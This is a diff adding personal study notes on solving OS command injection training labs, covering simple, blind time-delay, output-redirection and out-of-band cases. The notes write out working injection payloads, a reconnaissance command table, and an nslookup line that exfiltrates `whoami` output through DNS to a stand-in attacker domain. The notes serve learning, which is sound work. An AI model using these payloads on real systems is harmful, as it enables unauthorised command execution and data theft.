@@ -8,6 +8,50 @@ aiwefwlguh
 29: command not found
 -  the & after the command is to seperate the injected command from the rest to make sure what next wouldnt prevent the injection.
 ### Lab 01 [OS command injection, simple case]
-so the web has 1 functionality of checking stock and it passes the data with the url as we saw earlier,so lets manipulate the url with & os command &.
-function 3 -> function & echo anc &
-so in the lab its using url so && needs encoding first and even then didnt work in addition the function is not the url exactly as there is no change in the url when changing the choice so i searched in the html for the real function and started post requests trying to get a valid response from the server then i used ; to cut the function in the middle and puttted ;whoami to finish the exercise.
+so after playing with the function i learned few things:
+1 the http parser works with regular chars not url encoded ones when using url encoded & the http parser ignores it and the shell using it.
+2 the parameters going one after another and when using the shell operand & we backgrounding the function but we still have to consider the second argument as it became an argument to our whoami we putted in the first parameter.
+3 eval command recives input as code and lets the user run it.
+my solution: productId=1+%26&storeId=whoami
+way to get the function code: productId=%26+cat /home/peter-UtMtIS/stockreport.sh+%23&storeId=1
+the function:
+#!/bin/bash 
+set-eu 
+eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
+
+### useful commands in linux and windows to use when OS Injection Vulnerability Detected
+| Commands              | linux         | windows         |
+| --------------------- | ------------- | --------------- |
+| Name of current user  | `whoami`      | `whoami`        |
+| Operating system      | `uname -a`    | `ver`           |
+| Network configuration | `ifconfig`    | `ipconfig /all` |
+| Network connections   | `netstat -an` | `netstat -an`   |
+| Running processes     | `ps -ef`      | `tasklist`      |
+###  Blind OS command injection vulnerabilities
+Blind - vulnerability which dont response the output to the user with HTTP Response
+for example a feedback mail for administrator is never going to response your email with a http response with the output
+A way to move around it is to detect the vuln with time delay like & ping -c 10 127.0.0.1 &
+
+## Lab 02 [Blind OS command injection with time delay]
+L@gmail.com
+the email the only parameter which is vulnerable,the attack accure when the url encoded payload %26+ping+-c+20+127.0.0.1+%26 added to the email parameter.
+
+### blind OS command injection by redirecting output
+You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser.
+for example: & whoami > /var/www/static/whoami.txt &
+
+### Lab 03 Blind OS command injection with output redirection
+
+csrf=afXShuPMPvCjp6aN09CScRQXJbBwukH7&name=abc&email=abc%40gmail.com+%26+whoami+>+/var/www/images/output.txt+%26&subject=sdsdsds&message=sdsdsdsdsds
+same idea as before but with redirection as they teached us  before after making the payload i tried to pull the file from the folder with https://0a9a001f044848ff890281ae00a40030.web-security-academy.net/image i got missing parameter so i put  https://0a9a001f044848ff890281ae00a40030.web-security-academy.net/image?filename=output.txt and gatcha peter-3bLobN
+
+### OS command injection using out-of-band (OAST) techniques
+
+using os command injection to make a outbound network connection guess who is the destination?
+for example `& nslookup kgji2ohoyw.web-attacker.com &` 
+### Lab 04 out of band os command injection
+same here just putting in the email vulnerable part a payload like this `& nslookup kgji2ohoyw.web-attacker.com &` and encoding it then it solved 
+
+
+``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` will cause the shell to quest the dns server with asking about web named the whoami result.
+- lab 05 only for professional users :(
